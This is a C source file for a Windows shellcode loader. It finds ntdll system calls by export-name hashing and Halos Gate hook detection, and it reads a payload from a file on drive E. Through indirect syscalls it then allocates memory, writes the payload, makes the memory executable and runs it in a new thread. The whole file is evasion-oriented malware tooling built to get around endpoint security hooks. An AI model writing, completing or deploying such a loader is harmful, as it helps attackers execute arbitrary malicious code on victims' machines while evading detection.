#include <windows.h>
#include <winternl.h> // For NTSTATUS, etc.
#include <stdio.h>    // For file I/O

// Custom structures from Windows internals
typedef struct _VX_TABLE_ENTRY {
    PVOID pAddress;
    DWORD64 dwHash;
    WORD wSystemCall;
    PVOID pSyscallInstr;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtWriteVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, *PVX_TABLE;

// DJB2 hash function
DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x7734773477347734ULL;
    INT c;
    while ((c = *str++))
        dwHash = ((dwHash << 5) + dwHash) + c;
    return dwHash;
}

// Get TEB
PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x18);
#endif
}

// Get Export Directory
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

// Halos Gate logic to get SSN and syscall instr
#define UP -32
#define DOWN 32

BOOL GetSSNAndInstr(PVOID pFuncAddr, WORD* wSSN, PVOID* pInstr) {
    PBYTE addr = (PBYTE)pFuncAddr;
    if (addr[0] == 0x4c && addr[1] == 0x8b && addr[2] == 0xd1 &&
        addr[3] == 0xb8 && addr[6] == 0x00 && addr[7] == 0x00) {
        BYTE high = addr[5];
        BYTE low = addr[4];
        *wSSN = (high << 8) | low;
        *pInstr = addr + 0x12;
        return TRUE;
    }

    if (addr[0] == 0xe9 || addr[3] == 0xe9 || addr[8] == 0xe9 ||
        addr[10] == 0xe9 || addr[12] == 0xe9) {  // Hooked
        for (WORD idx = 1; idx <= 500; idx++) {
            // Check down
            PBYTE downAddr = addr + idx * DOWN;
            if (downAddr[0] == 0x4c && downAddr[1] == 0x8b && downAddr[2] == 0xd1 &&
                downAddr[3] == 0xb8 && downAddr[6] == 0x00 && downAddr[7] == 0x00) {
                BYTE high = downAddr[5];
                BYTE low = downAddr[4];
                *wSSN = (high << 8) | low - idx;
                *pInstr = downAddr + 0x12;
                return TRUE;
            }
            // Check up
            PBYTE upAddr = addr + idx * UP;
            if (upAddr[0] == 0x4c && upAddr[1] == 0x8b && upAddr[2] == 0xd1 &&
                upAddr[3] == 0xb8 && upAddr[6] == 0x00 && upAddr[7] == 0x00) {
                BYTE high = upAddr[5];
                BYTE low = upAddr[4];
                *wSSN = (high << 8) | low + idx;
                *pInstr = upAddr + 0x12;
                return TRUE;
            }
        }
    }
    return FALSE;
}

// Get Vx Table Entry
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pExportDir, PVX_TABLE_ENTRY pEntry) {
    PDWORD pdwAddrOfFuncs = (PDWORD)((PBYTE)pModuleBase + pExportDir->AddressOfFunctions);
    PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)pModuleBase + pExportDir->AddressOfNames);
    PWORD pwAddrOfNameOrds = (PWORD)((PBYTE)pModuleBase + pExportDir->AddressOfNameOrdinals);

    for (WORD i = 0; i < pExportDir->NumberOfNames; i++) {
        PCHAR pName = (PCHAR)((PBYTE)pModuleBase + pdwAddrOfNames[i]);
        if (djb2((PBYTE)pName) == pEntry->dwHash) {
            pEntry->pAddress = (PBYTE)pModuleBase + pdwAddrOfFuncs[pwAddrOfNameOrds[i]];
            return GetSSNAndInstr(pEntry->pAddress, &pEntry->wSystemCall, &pEntry->pSyscallInstr);
        }
    }
    return FALSE;
}

// Assembly externs
extern VOID PrepareSSN(WORD ssn);
extern VOID PrepareSyscallInst(PVOID instr);
extern NTSTATUS SyscallWrapper(); // Generic wrapper

int main() {
    // Get ntdll base
    PTEB teb = RtlGetThreadEnvironmentBlock();
    PPEB peb = teb->ProcessEnvironmentBlock;
    PLIST_ENTRY list = &peb->Ldr->InMemoryOrderModuleList;
    PLDR_DATA_TABLE_ENTRY ntdllEntry = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(list->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    PVOID ntdllBase = ntdllEntry->DllBase;

    // Get export dir
    PIMAGE_EXPORT_DIRECTORY exportDir;
    if (!GetImageExportDirectory(ntdllBase, &exportDir)) return 1;

    // Populate VX table
    VX_TABLE table = {0};
    table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89bULL;
    table.NtWriteVirtualMemory.dwHash = 0x68a3c2ba486f0741ULL;
    table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37ULL;
    table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015fULL;
    table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcbULL;

    if (!GetVxTableEntry(ntdllBase, exportDir, &table.NtAllocateVirtualMemory) ||
        !GetVxTableEntry(ntdllBase, exportDir, &table.NtWriteVirtualMemory) ||
        !GetVxTableEntry(ntdllBase, exportDir, &table.NtProtectVirtualMemory) ||
        !GetVxTableEntry(ntdllBase, exportDir, &table.NtCreateThreadEx) ||
        !GetVxTableEntry(ntdllBase, exportDir, &table.NtWaitForSingleObject)) {
        return 1; // Failed to resolve
    }

    // Function pointers using the wrapper
    typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, CONST PVOID, SIZE_T, PULONG);
    typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);

    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)SyscallWrapper;
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)SyscallWrapper;
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)SyscallWrapper;
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)SyscallWrapper;
    pNtWaitForSingleObject NtWaitForSingleObject = (pNtWaitForSingleObject)SyscallWrapper;

    // Read payload from file (using stdio for simplicity; can replace with syscalls if needed)
    FILE* fp = fopen("E:\\data.bin", "rb");
    if (!fp) return 1;
    fseek(fp, 0, SEEK_END);
    SIZE_T payloadSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    PVOID payload = malloc(payloadSize);
    if (!payload) { fclose(fp); return 1; }
    fread(payload, 1, payloadSize, fp);
    fclose(fp);

    // Allocate memory
    PVOID baseAddr = NULL;
    SIZE_T regionSize = payloadSize;
    PrepareSSN(table.NtAllocateVirtualMemory.wSystemCall);
    PrepareSyscallInst(table.NtAllocateVirtualMemory.pSyscallInstr);
    NTSTATUS status = NtAllocateVirtualMemory((HANDLE)-1, &baseAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) { free(payload); return 1; }

    // Write payload
    ULONG bytesWritten;
    PrepareSSN(table.NtWriteVirtualMemory.wSystemCall);
    PrepareSyscallInst(table.NtWriteVirtualMemory.pSyscallInstr);
    status = NtWriteVirtualMemory((HANDLE)-1, baseAddr, payload, payloadSize, &bytesWritten);
    free(payload);
    if (status != 0) return 1;

    // Protect to RX
    ULONG oldProtect;
    PrepareSSN(table.NtProtectVirtualMemory.wSystemCall);
    PrepareSyscallInst(table.NtProtectVirtualMemory.pSyscallInstr);
    status = NtProtectVirtualMemory((HANDLE)-1, &baseAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) return 1;

    // Create thread
    HANDLE hThread = NULL;
    PrepareSSN(table.NtCreateThreadEx.wSystemCall);
    PrepareSyscallInst(table.NtCreateThreadEx.pSyscallInstr);
    status = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, baseAddr, NULL, 0, 0, 0, 0, NULL);
    if (status != 0) return 1;

    // Wait
    LARGE_INTEGER timeout; timeout.QuadPart = -100000000LL; // 10 seconds
    PrepareSSN(table.NtWaitForSingleObject.wSystemCall);
    PrepareSyscallInst(table.NtWaitForSingleObject.pSyscallInstr);
    status = NtWaitForSingleObject(hThread, FALSE, &timeout);

    return 0;
}
